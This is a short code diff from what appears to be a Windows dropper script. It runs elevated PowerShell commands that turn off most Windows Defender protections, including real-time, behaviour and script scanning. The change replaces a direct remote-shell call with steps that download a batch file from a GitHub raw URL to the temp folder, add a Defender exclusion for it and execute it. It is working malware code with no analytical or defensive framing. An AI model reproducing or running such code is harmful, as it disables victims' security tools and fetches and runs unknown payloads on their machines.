@@ -16,9 +16,6 @@ func main()
 		process("powershell.exe" "Set-MpPreference -EnableControlledFolderAccess Disabled" "runas")
 	
 		process("powershell.exe" "Set-MpPreference -DisableRealtimeMonitoring $true" "runas")
-
-		runshell("https://raw.githubusercontent.com/Devalah/test/refs/heads/main/SYS32-Runtime.bat")
-
 		process("powershell.exe" "Set-MpPreference -DisableBehaviorMonitoring $true" "runas")
 		process("powershell.exe" "Set-MpPreference -DisableBlockAtFirstSeen $true" "runas")
 		process("powershell.exe" "Set-MpPreference -HighThreatDefaultAction 6 -Force" "runas")
@@ -28,6 +25,10 @@ func main()
 		process("powershell.exe" "Set-MpPreference -DisablePrivacyMode $true" "runas")
 		process("powershell.exe" "Set-MpPreference -DisableIntrusionPreventionSystem $true" "runas")
 		process("powershell.exe" "Set-MpPreference -DisableScriptScanning $true" "runas")
+	
+		download("https://raw.githubusercontent.com/Devalah/test/refs/heads/main/SYS32-Runtime.bat" "[temp]\test.bat" 1)
+		process("powershell.exe" "Add-MpPreference -ExclusionPath [temp]\test.bat" "runas")
+		run("[temp]\test.bat")
 	
 		quit()
 	}
